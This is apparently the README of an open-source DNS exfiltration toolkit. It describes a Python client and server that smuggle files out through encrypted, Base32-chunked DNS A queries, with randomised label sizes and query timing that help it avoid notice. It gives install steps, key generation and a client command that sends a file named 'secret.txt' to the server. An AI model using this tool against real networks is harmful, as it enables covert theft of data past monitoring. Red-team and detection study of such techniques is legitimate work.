# DNS Exfiltration Client & Server (v2.5)

This toolkit demonstrates secure, authenticated DNS-based file exfiltration using modern cryptography:

- **Perfect Forward Secrecy** via ephemeral X25519 ECDH  
- **Authenticated encryption** using AES-GCM for confidentiality + HMAC-SHA256 for integrity  
- **Base32** payload encoding for DNS-safe transfers  
- **Chunked UDP DNS A queries** for transport  
- **Stateless session reassembly** on the server keyed by client UUID  

---

## 🔧 Components

### client.py

- Generates an ephemeral X25519 keypair per transfer  
- Sends your public key in Base32 chunks (`<id>-0-0-<pubkey>`)  
- Derives a per-transfer AES (32 B) + HMAC (16 B) key via HKDF  
- Encrypts your file with AES-GCM (12 B nonce)  
- Appends an HMAC-SHA256 tag to the ciphertext  
- Base32-encodes the combined blob, splits into **randomized-size** subdomains (≤ 52 chars of data) to vary label lengths  
- Issues DNS A queries with client-configurable inter-query delays (`--delay-low`/`--delay-high`)  
- Retries missing chunks up to `MAX_RETRIES`  

### server.py

- Listens on UDP port 53 for DNS A queries  
- Parses `<id>-<idx>-<total>-<fragment>` subdomains  
- On `idx=0,total=0`, reassembles client’s ephemeral public key and performs ECDH → HKDF  
- Buffers Base32 fragments, applies padding, decodes via `base64.b32decode`  
- Splits out the last 32 bytes as HMAC tag and verifies it, then AES-GCM decrypts  
- Writes plaintext to `output/<id>.bin` and cleans up idle sessions  

---

## 📥 Installation

```bash
git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
cd python-dns-exfiltration-client-server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## 🔒 Configuration

Create a `.env` in the project root for the server:

```ini
SERVER_PRIVATE_KEY=./server.key
```

- `server.key` must be a raw 32 B X25519 private key (no PEM header).  
- Generate one in Bash:

  ```bash
  python3 - << 'EOF'
  from cryptography.hazmat.primitives.asymmetric import x25519
  from cryptography.hazmat.primitives import serialization
  key = x25519.X25519PrivateKey.generate()
  raw = key.private_bytes(
    encoding=serialization.Encoding.Raw,
    format=serialization.PrivateFormat.Raw,
    encryption_algorithm=serialization.NoEncryption()
  )
  open('server.key','wb').write(raw)
  EOF
  ```

---

## 🚀 Usage

### Start Server

```bash
python server.py \
  --port 5300 \
  --domain example.com \
  --output-dir output
```

_By default, it reads `SERVER_PRIVATE_KEY` from `.env` (override with `--server-key`)._

### Run Client

```bash
python client.py \
  --server-ip    127.0.0.1 \
  --server-port  5300 \
  --domain       example.com \
  --server-pubkey server_public.key \
  --file-path    secret.txt \
  --delay-low    200 \
  --delay-high   500
```

- `--delay-low` / `--delay-high` specify the minimum/maximum inter-query delay in **ms** (default `200–500 ms`)  
- The client first exchanges keys (`0-0` subdomain) then sends encrypted + HMAC-tagged chunks:  
  ```
  <id>-<i>-<total>-<data>
  ```

---

## ⏱️ Client Throttling

To avoid overloading public recursive resolvers, the client inserts a randomized pause between each DNS query.  
**Recommended defaults:** `--delay-low 200`, `--delay-high 500` (i.e. 2–5 qps). Increase to `500–1000 ms` on unstable networks or reduce to `100–200 ms` in lab environments.

---

## 🔍 What HMAC Adds

- **Integrity**: ensures ciphertext wasn’t altered  
- **Authentication**: only someone with the HMAC key can produce valid tags  

---

## ⚙️ CLI Reference

**Server**:

```text
usage: server.py [-h]
                 [--port PORT]
                 [--output-dir DIR]
                 [--low LOW]
                 [--high HIGH]
                 [--domain DOMAIN]
                 [--server-key PATH]
```

**Client**:

```text
usage: client.py [-h]
                 [--server-ip IP]
                 [--server-port PORT]
                 [--domain DOMAIN]
                 [--server-pubkey PATH]
                 [--delay-low MS]
                 [--delay-high MS]
                 --file-path FILE_PATH
```

---

## 📁 Output

Decrypted files land in `--output-dir` (default `output/`). File names match the session ID.

---

## 🛡️ Security Notes

- Fresh ECDH key per transfer → **forward secrecy**  
- AES-GCM + HMAC → **confidentiality**, **integrity**, **authentication**  
- No persistent session state; idle sessions auto-cleaned  

---

## 📜 License & Author

**Author:** John Burns  
**Date:** 2025-05-07 
**License:** GPL-3.0  
```  
